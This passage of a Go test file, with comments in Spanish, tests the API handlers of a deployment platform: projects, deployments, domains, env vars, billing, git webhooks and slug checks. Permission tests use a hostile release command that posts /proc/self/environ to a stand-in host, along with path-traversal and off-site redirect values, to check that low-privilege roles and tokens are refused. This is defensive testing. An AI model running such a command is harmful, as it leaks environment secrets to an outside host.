		"release command":   `{"release_command":"curl -d @/proc/self/environ evil"}`,
		"root dir":          `{"root_dir":"../otro"}`,
		"output dir":        `{"output_dir":"/etc"}`,
		"framework":         `{"framework":"docker"}`,
		"build strategy":    `{"build_strategy":"dockerfile"}`,
		"redirecciones":     `{"http_rules":{"redirects":[{"from":"/","to":"https://ajeno.example"}]}}`,
	}
	for _, rol := range []domain.Role{domain.RoleMember, domain.RoleBilling} {
		for nombre, cuerpo := range cuerpos {
			f := &fakeSvc{project: domain.Project{Slug: "web"}, effRole: rol, effFromMember: true}
			h := newHandlers(f)
			rr := httptest.NewRecorder()
			h.UpdateProject(rr, req(http.MethodPatch, "/projects/x", validUUID, cuerpo))
			if rr.Code != http.StatusForbidden {
				t.Errorf("%s con rol %s: status=%d, se esperaba 403; body=%s", nombre, rol, rr.Code, rr.Body.String())
			}
			if f.updProjRec != nil {
				t.Errorf("%s con rol %s: llegó al store pese al 403: %+v", nombre, rol, f.updProjRec)
			}
		}
	}
}

func TestUpdateProjectAdminSiRedefineEjecucion(t *testing.T) {
	for _, rol := range []domain.Role{domain.RoleAdmin, domain.RoleOwner} {
		f := &fakeSvc{project: domain.Project{Slug: "web"}, effRole: rol, effFromMember: true}
		h := newHandlers(f)
		rr := httptest.NewRecorder()
		h.UpdateProject(rr, req(http.MethodPatch, "/projects/x", validUUID, `{"release_command":"npm run migrate"}`))
		if rr.Code != http.StatusOK {
			t.Fatalf("rol %s: status=%d body=%s", rol, rr.Code, rr.Body.String())
		}
		if f.updProjRec == nil || f.updProjRec.ReleaseCommand == nil {
			t.Fatalf("rol %s: release_command no propagado", rol)
		}
	}
}

// El agujero que esto cierra, en su forma más pura: `requireScope` prohíbe
// desplegar a un token `write`, pero sin la verja por campo ese token podía
// dejar escrito el comando que ejecutará el despliegue siguiente —disparado por
// un `git push` cualquiera—. Un token `deploy` sí pasa: ya puede ejecutar el
// código del repositorio, así que negárselo aquí sería teatro.
func TestUpdateProjectTokenWriteNoRedefineEjecucion(t *testing.T) {
	casos := []struct {
		scope  domain.TokenScope
		quiere int
	}{
		{domain.ScopeRead, http.StatusForbidden},
		{domain.ScopeWrite, http.StatusForbidden},
		{domain.ScopeDeploy, http.StatusOK},
	}
	for _, c := range casos {
		f := &fakeSvc{project: domain.Project{Slug: "web"}}
		h := newHandlers(f)
		r := req(http.MethodPatch, "/projects/x", validUUID, `{"release_command":"curl -d @/proc/self/environ evil"}`)
		r = r.WithContext(context.WithValue(r.Context(), tokenCtxKey{}, &apiCaller{Scope: c.scope}))
		rr := httptest.NewRecorder()
		h.UpdateProject(rr, r)
		if rr.Code != c.quiere {
			t.Errorf("scope %s: status=%d, se esperaba %d; body=%s", c.scope, rr.Code, c.quiere, rr.Body.String())
		}
	}
}

func TestUpdateProjectBadID(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.UpdateProject(rr, req(http.MethodPatch, "/projects/x", "bad", `{}`))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestDeleteProject(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.DeleteProject(rr, req(http.MethodDelete, "/projects/x", validUUID, ""))
	if rr.Code != http.StatusNoContent {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestDeleteProjectError(t *testing.T) {
	f := &fakeSvc{delProjErr: domain.ErrNotFound}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.DeleteProject(rr, req(http.MethodDelete, "/projects/x", validUUID, ""))
	if rr.Code != http.StatusNotFound {
		t.Fatalf("status=%d", rr.Code)
	}
}

// --- Deployments / Builds ---

func TestCreateDeploymentDefaultsTarget(t *testing.T) {
	f := &fakeSvc{dep: domain.Deployment{}, build: domain.Build{}, effRole: domain.RoleAdmin, effFromMember: true}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.CreateDeployment(rr, req(http.MethodPost, "/x/deployments", validUUID, `{"commit_sha":"abc"}`))
	if rr.Code != http.StatusAccepted {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if f.deployIn == nil || f.deployIn.Target != domain.TargetProduction {
		t.Fatalf("target por defecto no aplicado: %+v", f.deployIn)
	}
	if f.deployIn.CreatedBy != "user-1" {
		t.Fatalf("created_by no propagado")
	}
}

func TestCreateDeploymentBadID(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.CreateDeployment(rr, req(http.MethodPost, "/x/deployments", "bad", `{}`))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestCreateDeploymentBadJSON(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.CreateDeployment(rr, req(http.MethodPost, "/x/deployments", validUUID, `{bad`))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestCreateDeploymentInvalidInput(t *testing.T) {
	f := &fakeSvc{deployErr: domain.ErrInvalidInput}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.CreateDeployment(rr, req(http.MethodPost, "/x/deployments", validUUID, `{"target":"preview"}`))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestListDeploymentsEmptyAndLimit(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.ListDeployments(rr, req(http.MethodGet, "/x/deployments?limit=5", validUUID, ""))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	env := decodeEnvelope(t, rr)
	if arr, ok := env["deployments"].([]any); !ok || arr == nil {
		t.Fatalf("deployments debe ser []")
	}
	if _, ok := env["next_cursor"]; ok {
		t.Fatal("sin más páginas no debe haber next_cursor")
	}
}

func TestListDeploymentsNextCursor(t *testing.T) {
	h := newHandlers(&fakeSvc{nextCursor: "tok123"})
	rr := httptest.NewRecorder()
	h.ListDeployments(rr, req(http.MethodGet, "/x/deployments?cursor=abc&limit=5", validUUID, ""))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	if got := decodeEnvelope(t, rr)["next_cursor"]; got != "tok123" {
		t.Fatalf("next_cursor=%v, quiero tok123", got)
	}
}

func TestListBuildsNextCursor(t *testing.T) {
	h := newHandlers(&fakeSvc{nextCursor: "tok456"})
	rr := httptest.NewRecorder()
	h.ListBuilds(rr, req(http.MethodGet, "/x/builds", validUUID, ""))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	if got := decodeEnvelope(t, rr)["next_cursor"]; got != "tok456" {
		t.Fatalf("next_cursor=%v, quiero tok456", got)
	}
}

func TestGetDeploymentNotFound(t *testing.T) {
	f := &fakeSvc{depErr: domain.ErrNotFound}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.GetDeployment(rr, req(http.MethodGet, "/deployments/x", validUUID, ""))
	if rr.Code != http.StatusNotFound {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestRollbackInvalidState(t *testing.T) {
	f := &fakeSvc{rbErr: domain.ErrInvalidState}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.Rollback(rr, req(http.MethodPost, "/deployments/x/rollback", validUUID, ""))
	if rr.Code != http.StatusConflict {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestRollbackOK(t *testing.T) {
	f := &fakeSvc{rollback: domain.Deployment{}}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.Rollback(rr, req(http.MethodPost, "/deployments/x/rollback", validUUID, ""))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestCancelDeployment(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.CancelDeployment(rr, req(http.MethodDelete, "/deployments/x", validUUID, ""))
	if rr.Code != http.StatusNoContent {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestCancelDeploymentBadID(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.CancelDeployment(rr, req(http.MethodDelete, "/deployments/x", "bad", ""))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestListBuildsEmpty(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.ListBuilds(rr, req(http.MethodGet, "/x/builds", validUUID, ""))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	if arr, ok := decodeEnvelope(t, rr)["builds"].([]any); !ok || arr == nil {
		t.Fatalf("builds debe ser []")
	}
}

func TestGetBuild500(t *testing.T) {
	f := &fakeSvc{buildErr: errors.New("db down")}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.GetBuild(rr, req(http.MethodGet, "/builds/x", validUUID, ""))
	if rr.Code != http.StatusInternalServerError {
		t.Fatalf("status=%d", rr.Code)
	}
	if c := errCode(t, rr); c != "internal" {
		t.Fatalf("code=%q", c)
	}
}

// --- Dominios ---

func TestAddDomain(t *testing.T) {
	f := &fakeSvc{dom: domain.Domain{Hostname: "www.example.com", VerifyToken: "sytue-verify=abc"}}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.AddDomain(rr, req(http.MethodPost, "/x/domains", validUUID, `{"hostname":"www.example.com"}`))
	if rr.Code != http.StatusCreated {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if f.addHost != "www.example.com" {
		t.Fatalf("hostname no propagado: %q", f.addHost)
	}
	m := decodeEnvelope(t, rr)
	dns, ok := m["dns"].(map[string]any)
	if !ok || dns["cname_target"] != "ingress.sytue.eu" {
		t.Fatalf("instrucciones DNS ausentes: %v", m)
	}
	if dns["txt_value"] != "sytue-verify=abc" {
		t.Fatalf("txt_value=%v", dns["txt_value"])
	}
}

func TestAddDomainInvalid(t *testing.T) {
	f := &fakeSvc{domErr: domain.ErrInvalidInput}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.AddDomain(rr, req(http.MethodPost, "/x/domains", validUUID, `{"hostname":"bad host"}`))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestAddDomainTaken(t *testing.T) {
	f := &fakeSvc{domErr: domain.ErrDomainTaken}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.AddDomain(rr, req(http.MethodPost, "/x/domains", validUUID, `{"hostname":"www.example.com"}`))
	if rr.Code != http.StatusConflict {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestListDomainsEmpty(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.ListDomains(rr, req(http.MethodGet, "/x/domains", validUUID, ""))
	if arr, ok := decodeEnvelope(t, rr)["domains"].([]any); !ok || arr == nil {
		t.Fatalf("domains debe ser []")
	}
}

func TestRemoveDomain(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.RemoveDomain(rr, req(http.MethodDelete, "/domains/x", validUUID, ""))
	if rr.Code != http.StatusNoContent {
		t.Fatalf("status=%d", rr.Code)
	}
}

// --- Env / secretos ---

func TestSetEnv(t *testing.T) {
	f := &fakeSvc{env: domain.EnvVar{Key: "API_KEY"}, effRole: domain.RoleAdmin, effFromMember: true}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.SetEnv(rr, req(http.MethodPut, "/x/env", validUUID, `{"key":" API_KEY ","value":"v","is_secret":true,"scope":"all"}`))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if f.setEnvIn == nil || f.setEnvIn.Key != "API_KEY" || !f.setEnvIn.IsSecret {
		t.Fatalf("entrada env no propagada: %+v", f.setEnvIn)
	}
}

func TestSetEnvInvalidKey(t *testing.T) {
	f := &fakeSvc{envErr: domain.ErrInvalidInput, effRole: domain.RoleAdmin, effFromMember: true}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.SetEnv(rr, req(http.MethodPut, "/x/env", validUUID, `{"key":"bad key"}`))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestListEnvEmpty(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.ListEnv(rr, req(http.MethodGet, "/x/env", validUUID, ""))
	if arr, ok := decodeEnvelope(t, rr)["env"].([]any); !ok || arr == nil {
		t.Fatalf("env debe ser []")
	}
}

func TestDeleteEnv(t *testing.T) {
	h := newHandlers(&fakeSvc{effRole: domain.RoleAdmin, effFromMember: true})
	rr := httptest.NewRecorder()
	h.DeleteEnv(rr, req(http.MethodDelete, "/env/x", validUUID, ""))
	if rr.Code != http.StatusNoContent {
		t.Fatalf("status=%d", rr.Code)
	}
}

// --- Servicios gestionados ---

func TestProvisionService(t *testing.T) {
	f := &fakeSvc{svc: domain.ManagedService{Kind: domain.ServiceKind("postgres")}}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.ProvisionService(rr, req(http.MethodPost, "/x/services", validUUID, `{"kind":"postgres","name":" db "}`))
	if rr.Code != http.StatusAccepted {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if f.provisionIn == nil || f.provisionIn.Name != "db" || f.provisionIn.Kind != domain.ServiceKind("postgres") {
		t.Fatalf("entrada provision no propagada: %+v", f.provisionIn)
	}
}

func TestProvisionServiceInvalid(t *testing.T) {
	f := &fakeSvc{svcErr: domain.ErrInvalidInput}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.ProvisionService(rr, req(http.MethodPost, "/x/services", validUUID, `{"kind":"bogus"}`))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestListServicesEmpty(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.ListServices(rr, req(http.MethodGet, "/x/services", validUUID, ""))
	if arr, ok := decodeEnvelope(t, rr)["services"].([]any); !ok || arr == nil {
		t.Fatalf("services debe ser []")
	}
}

func TestGetServiceNotFound(t *testing.T) {
	f := &fakeSvc{svcErr: domain.ErrNotFound}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.GetService(rr, req(http.MethodGet, "/services/x", validUUID, ""))
	if rr.Code != http.StatusNotFound {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestDeleteService(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.DeleteService(rr, req(http.MethodDelete, "/services/x", validUUID, ""))
	if rr.Code != http.StatusNoContent {
		t.Fatalf("status=%d", rr.Code)
	}
}

// --- Uso ---

func TestGetUsageEmpty(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.GetUsage(rr, req(http.MethodGet, "/usage?from=2026-01-01T00:00:00Z&to=2026-02-01T00:00:00Z", "", ""))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	if arr, ok := decodeEnvelope(t, rr)["usage"].([]any); !ok || arr == nil {
		t.Fatalf("usage debe ser []")
	}
}

func TestGetUsageError(t *testing.T) {
	f := &fakeSvc{usageErr: errors.New("db")}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.GetUsage(rr, req(http.MethodGet, "/usage", "", ""))
	if rr.Code != http.StatusInternalServerError {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestGetUsageDetailEmpty(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.GetUsageDetail(rr, req(http.MethodGet, "/usage/detail", "", ""))
	if arr, ok := decodeEnvelope(t, rr)["records"].([]any); !ok || arr == nil {
		t.Fatalf("records debe ser []")
	}
}

// --- Facturación ---

func TestGetPricingExposesTable(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.GetPricing(rr, req(http.MethodGet, "/billing/pricing", "", ""))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	m := decodeEnvelope(t, rr)
	if m["currency"] != "EUR" {
		t.Errorf("currency=%v", m["currency"])
	}
	metrics, ok := m["metrics"].([]any)
	if !ok || len(metrics) != len(domain.PricingTable) {
		t.Fatalf("metrics inesperado: %v", m["metrics"])
	}
	if plans, ok := m["plans"].([]any); !ok || len(plans) != 3 {
		t.Fatalf("esperados 3 planes, got %v", m["plans"])
	}
}

func TestGetBillingAccount(t *testing.T) {
	f := &fakeSvc{
		billingAcct:  domain.BillingAccount{Tenant: "acme", Plan: domain.PlanPro},
		currentSpend: 21.5,
	}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.GetBillingAccount(rr, req(http.MethodGet, "/billing/account", "", ""))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	if spend, _ := decodeEnvelope(t, rr)["current_spend_eur"].(float64); spend != 21.5 {
		t.Errorf("current_spend_eur=%v", spend)
	}
}

func TestSetSpendLimit(t *testing.T) {
	f := &fakeSvc{billingAcct: domain.BillingAccount{Tenant: "acme"}}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.SetSpendLimit(rr, req(http.MethodPut, "/billing/spend-limit", "", `{"spend_limit_eur": 50}`))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if f.setLimit == nil || *f.setLimit != 50 {
		t.Errorf("setLimit=%v, esperado 50", f.setLimit)
	}
	// Sin campo → nil (quita el tope).
	rr = httptest.NewRecorder()
	h.SetSpendLimit(rr, req(http.MethodPut, "/billing/spend-limit", "", `{}`))
	if f.setLimit != nil {
		t.Errorf("setLimit=%v, esperado nil", f.setLimit)
	}
}

func TestGenerateInvoiceHandler(t *testing.T) {
	f := &fakeSvc{invoice: domain.Invoice{ID: uuid.New(), TotalEur: 21.5}}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	body := `{"from":"2026-06-01T00:00:00Z","to":"2026-07-01T00:00:00Z"}`
	h.GenerateInvoice(rr, req(http.MethodPost, "/billing/invoices:generate", "", body))
	if rr.Code != http.StatusCreated {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if f.genFrom.IsZero() || f.genTo.IsZero() {
		t.Error("no se pasó el periodo al servicio")
	}
}

func TestListInvoicesCursor(t *testing.T) {
	inv := domain.Invoice{ID: uuid.New(), PeriodFrom: time.Date(2026, 6, 1, 0, 0, 0, 0, time.UTC)}
	f := &fakeSvc{invoices: []domain.Invoice{inv}}
	h := newHandlers(f)
	rr := httptest.NewRecorder()
	h.ListInvoices(rr, req(http.MethodGet, "/billing/invoices", "", ""))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	next, _ := decodeEnvelope(t, rr)["next_cursor"].(string)
	if next == "" {
		t.Fatal("esperado next_cursor no vacío")
	}
	// El cursor debe redecodificar al mismo (periodo, id).
	gotPeriod, gotID := decodeInvoiceCursor(next)
	if !gotPeriod.Equal(inv.PeriodFrom) || gotID != inv.ID {
		t.Errorf("cursor roundtrip: %v/%v vs %v/%v", gotPeriod, gotID, inv.PeriodFrom, inv.ID)
	}
}

// --- Webhooks git ---

func webhookReq(t *testing.T, body []byte, headers map[string]string) *http.Request {
	t.Helper()
	r := httptest.NewRequest(http.MethodPost, "/webhooks/git", strings.NewReader(string(body)))
	for k, v := range headers {
		r.Header.Set(k, v)
	}
	return r
}

func ghSig(secret string, body []byte) string {
	m := hmac.New(sha256.New, []byte(secret))
	m.Write(body)
	return "sha256=" + hex.EncodeToString(m.Sum(nil))
}

func TestGitWebhookUnknownProvider(t *testing.T) {
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.GitWebhook(rr, webhookReq(t, []byte(`{}`), nil))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestGitWebhookBadSignature(t *testing.T) {
	// La verificación por-proyecto vive en el servicio; el handler traduce
	// ErrSignatureInvalid a 401 (el cuerpo parsea como push válido primero).
	body := []byte(`{"ref":"refs/heads/main","after":"abc123",
		"repository":{"clone_url":"https://github.com/acme/app.git"},"pusher":{"name":"a"}}`)
	h := newHandlers(&fakeSvc{verifyErr: domain.ErrSignatureInvalid})
	rr := httptest.NewRecorder()
	h.GitWebhook(rr, webhookReq(t, body, map[string]string{
		"X-GitHub-Event":      "push",
		"X-Hub-Signature-256": "sha256=deadbeef",
	}))
	if rr.Code != http.StatusUnauthorized {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
}

func TestGitWebhookRepoNotConnectedByVerify(t *testing.T) {
	// VerifyWebhook devuelve ErrNotFound (repo no asociado) => 202 matched:false,
	// sin tocar HandleGitEvent.
	body := []byte(`{"ref":"refs/heads/main","after":"abc123",
		"repository":{"clone_url":"https://github.com/acme/app.git"},"pusher":{"name":"a"}}`)
	h := newHandlers(&fakeSvc{verifyErr: domain.ErrNotFound})
	rr := httptest.NewRecorder()
	h.GitWebhook(rr, webhookReq(t, body, map[string]string{
		"X-GitHub-Event":      "push",
		"X-Hub-Signature-256": "sha256=deadbeef",
	}))
	if rr.Code != http.StatusAccepted {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if decodeEnvelope(t, rr)["matched"] != false {
		t.Fatalf("esperado matched=false: %s", rr.Body.String())
	}
}

func TestGitWebhookIgnoredEvent(t *testing.T) {
	// Evento 'ping' de GitHub → ParseWebhook error ErrInvalidState → 200 ignored.
	body := []byte(`{}`)
	h := newHandlers(&fakeSvc{})
	rr := httptest.NewRecorder()
	h.GitWebhook(rr, webhookReq(t, body, map[string]string{
		"X-GitHub-Event":      "ping",
		"X-Hub-Signature-256": ghSig("s3cr3t", body),
	}))
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if decodeEnvelope(t, rr)["ignored"] != true {
		t.Fatalf("esperado ignored: %s", rr.Body.String())
	}
}

func TestGitWebhookPushDeploys(t *testing.T) {
	body := []byte(`{"ref":"refs/heads/main","after":"abc123",
		"repository":{"clone_url":"https://github.com/acme/app.git"},"pusher":{"name":"a"}}`)
	dep := &domain.Deployment{}
	h := newHandlers(&fakeSvc{gitDep: dep})
	rr := httptest.NewRecorder()
	h.GitWebhook(rr, webhookReq(t, body, map[string]string{
		"X-GitHub-Event":      "push",
		"X-Hub-Signature-256": ghSig("s3cr3t", body),
	}))
	if rr.Code != http.StatusAccepted {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if _, ok := decodeEnvelope(t, rr)["deployment"]; !ok {
		t.Fatalf("sin deployment en respuesta")
	}
}

func TestGitWebhookRepoNotConnected(t *testing.T) {
	body := []byte(`{"ref":"refs/heads/main","after":"abc",
		"repository":{"clone_url":"https://github.com/acme/app.git"},"pusher":{"name":"a"}}`)
	h := newHandlers(&fakeSvc{gitErr: domain.ErrNotFound})
	rr := httptest.NewRecorder()
	h.GitWebhook(rr, webhookReq(t, body, map[string]string{
		"X-GitHub-Event":      "push",
		"X-Hub-Signature-256": ghSig("s3cr3t", body),
	}))
	if rr.Code != http.StatusAccepted {
		t.Fatalf("status=%d", rr.Code)
	}
	if decodeEnvelope(t, rr)["matched"] != false {
		t.Fatalf("esperado matched=false: %s", rr.Body.String())
	}
}

// --- Helpers de query ---

func TestQueryLimitAndPeriod(t *testing.T) {
	r := httptest.NewRequest(http.MethodGet, "/?limit=7&from=2026-01-01T00:00:00Z&to=bad", http.NoBody)
	if got := queryLimit(r); got != 7 {
		t.Fatalf("queryLimit=%d", got)
	}
	from, to := periodFromQuery(r)
	if from.IsZero() {
		t.Fatalf("from debía parsearse")
	}
	if !to.IsZero() {
		t.Fatalf("to inválido debe quedar cero")
	}
}

func TestSubFromCtxEmpty(t *testing.T) {
	r := httptest.NewRequest(http.MethodGet, "/", http.NoBody)
	if got := subFromCtx(r); got != "" {
		t.Fatalf("subFromCtx sin claims=%q", got)
	}
}

func TestWebhookHeaders(t *testing.T) {
	gl := httptest.NewRequest(http.MethodPost, "/", http.NoBody)
	gl.Header.Set("X-Gitlab-Event", "Push Hook")
	gl.Header.Set("X-Gitlab-Event-UUID", "uuid-1")
	p, ev, id := webhookHeaders(gl)
	if p != domain.GitLab || ev != "Push Hook" || id != "uuid-1" {
		t.Fatalf("gitlab headers: %v %v %v", p, ev, id)
	}
	none := httptest.NewRequest(http.MethodPost, "/", http.NoBody)
	if p, _, _ := webhookHeaders(none); p != "" {
		t.Fatalf("sin cabeceras debe ser vacío: %v", p)
	}
}

func TestGitHubAppCallback(t *testing.T) {
	cb := func(f *fakeSvc, q string) *httptest.ResponseRecorder {
		rr := httptest.NewRecorder()
		r := req(http.MethodGet, "/github/callback?"+q, "", "")
		newHandlers(f).GitHubAppCallback(rr, r)
		return rr
	}

	// OK: state emitido por el servidor + installation_id + code.
	f := &fakeSvc{ghState: "emitido"}
	rr := cb(f, "state=emitido&installation_id=999&code=abc")
	if rr.Code != http.StatusOK {
		t.Fatalf("code=%d body=%s", rr.Code, rr.Body.String())
	}
	if f.ghOwnInstall != 999 || f.ghOwnCode != "abc" {
		t.Fatalf("service recibió install=%d code=%q", f.ghOwnInstall, f.ghOwnCode)
	}

	// CLOUD-18: el id del proyecto como state ya no liga nada.
	f = &fakeSvc{ghState: "emitido"}
	if rr = cb(f, "state="+validUUID+"&installation_id=1&code=abc"); rr.Code != http.StatusBadRequest || f.ghOwnInstall != 0 {
		t.Fatalf("state = id de proyecto: code=%d install=%d", rr.Code, f.ghOwnInstall)
	}

	// installation_id ausente/<=0 → 400.
	f = &fakeSvc{ghState: "emitido"}
	if rr = cb(f, "state=emitido&installation_id=0&code=abc"); rr.Code != http.StatusBadRequest || f.ghOwnInstall != 0 {
		t.Fatalf("installation_id inválido: code=%d", rr.Code)
	}

	// code ausente → 400.
	f = &fakeSvc{ghState: "emitido"}
	if rr = cb(f, "state=emitido&installation_id=5"); rr.Code != http.StatusBadRequest || f.ghOwnInstall != 0 {
		t.Fatalf("code ausente: code=%d", rr.Code)
	}

	// Error de dominio del service (ErrPermission) → 403.
	f = &fakeSvc{ghState: "emitido", ghOwnErr: domain.ErrPermission}
	if rr = cb(f, "state=emitido&installation_id=5&code=abc"); rr.Code != http.StatusForbidden {
		t.Fatalf("ErrPermission debe ser 403: %d", rr.Code)
	}
}

// --- Nombre de proyecto: sugerencia y disponibilidad en vivo ---

// El idioma sale de la petición: parámetro explícito si viene y, si no, la cabecera
// Accept-Language. La regla está testeada en domain; aquí se comprueba el CABLEADO,
// que es lo que se olvida (leer la cabecera equivocada o no leer ninguna).
func TestElIdiomaSaleDeLaPeticion(t *testing.T) {
	casos := []struct {
		target string
		header string
		want   string
	}{
		{"/check-slug?slug=mi-tienda", "", "en"},
		{"/check-slug?slug=mi-tienda", "de-AT,de;q=0.9,en;q=0.5", "de"},
		{"/check-slug?slug=mi-tienda&lang=it", "de", "it"},
	}
	for _, caso := range casos {
		f := &fakeSvc{slugCheck: service.SlugCheck{Slug: "mi-tienda", Available: true}}
		r := req(http.MethodGet, caso.target, "", "")
		if caso.header != "" {
			r.Header.Set("Accept-Language", caso.header)
		}
		rr := httptest.NewRecorder()
		newHandlers(f).CheckSlug(rr, r)
		if rr.Code != http.StatusOK {
			t.Fatalf("%s: status=%d body=%s", caso.target, rr.Code, rr.Body.String())
		}
		if f.slugLang != caso.want {
			t.Errorf("%s (Accept-Language %q): idioma=%q, se esperaba %q",
				caso.target, caso.header, f.slugLang, caso.want)
		}
		if f.checkedSlug != "mi-tienda" {
			t.Errorf("el slug consultado fue %q", f.checkedSlug)
		}
		if cc := rr.Header().Get("Cache-Control"); cc != "no-store" {
			t.Errorf("Cache-Control=%q: una disponibilidad cacheada lleva al 409 que esto evita", cc)
		}
	}
}

// Un nombre inválido es un 400 con su motivo, no un «ocupado» silencioso: el
// usuario tiene que poder distinguir «ese nombre no vale» de «ese nombre es de otro».
func TestCheckSlugRechazaUnNombreInvalido(t *testing.T) {
	f := &fakeSvc{slugCheckErr: domain.ErrInvalidInput}
	rr := httptest.NewRecorder()
	newHandlers(f).CheckSlug(rr, req(http.MethodGet, "/check-slug?slug=MAL%20NOMBRE", "", ""))
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d, se esperaba 400", rr.Code)
	}
	if c := errCode(t, rr); c != "bad_request" {
		t.Fatalf("code=%q", c)
	}
}

// Las alternativas viajan tal cual al cliente: son la mitad útil de la respuesta
// cuando el nombre está cogido.
func TestCheckSlugDevuelveAlternativas(t *testing.T) {
	f := &fakeSvc{slugCheck: service.SlugCheck{
		Slug:         "mi-tienda",
		Alternatives: []string{"mi-tienda-2", "mi-tienda-firme"},
		Lang:         "es",
	}}
	rr := httptest.NewRecorder()
	newHandlers(f).CheckSlug(rr, req(http.MethodGet, "/check-slug?slug=mi-tienda&lang=es", "", ""))
	m := decodeEnvelope(t, rr)
	if m["available"] != false {
		t.Fatalf("available=%v", m["available"])
	}
	alts, _ := m["alternatives"].([]any)
	if len(alts) != 2 || alts[0] != "mi-tienda-2" {
		t.Fatalf("alternativas=%v", m["alternatives"])
	}
}

func TestSuggestProjectSlugPasaElIdioma(t *testing.T) {
	f := &fakeSvc{suggestedSlug: "ruhiger-hafen"}
	r := req(http.MethodGet, "/suggest-slug", "", "")
	r.Header.Set("Accept-Language", "pt-BR,de;q=0.8")
	rr := httptest.NewRecorder()
	newHandlers(f).SuggestProjectSlug(rr, r)
	if f.slugLang != "de" {
		t.Fatalf("idioma=%q: pt-BR no está en la lista, toca pasar a la siguiente", f.slugLang)
	}
